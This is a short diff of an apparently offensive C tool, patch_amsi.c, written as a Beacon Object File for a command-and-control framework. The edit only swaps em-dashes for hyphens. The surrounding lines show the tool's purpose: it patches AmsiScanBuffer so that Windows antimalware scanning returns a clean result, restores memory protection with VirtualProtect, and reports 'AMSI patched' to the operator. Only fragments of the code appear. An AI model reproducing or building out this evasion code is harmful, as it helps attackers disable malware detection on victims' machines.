@@ -1,5 +1,5 @@
 /*
- * patch_amsi.c — Patch AmsiScanBuffer to return clean result
+ * patch_amsi.c - Patch AmsiScanBuffer to return clean result
  *
  * Overwrites the first bytes of AmsiScanBuffer with a stub that
  * returns E_INVALIDARG (0x80070057), causing AMSI to treat every
@@ -64,5 +64,5 @@ void go(char* args, int len)
     DWORD tmp = 0;
     KERNEL32$VirtualProtect((LPVOID)pAmsiScanBuffer, patchLen, oldProtect, &tmp);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "AMSI patched — AmsiScanBuffer now returns E_INVALIDARG (0x80070057)");
+    BeaconPrintf(CALLBACK_OUTPUT, "AMSI patched - AmsiScanBuffer now returns E_INVALIDARG (0x80070057)");
 }
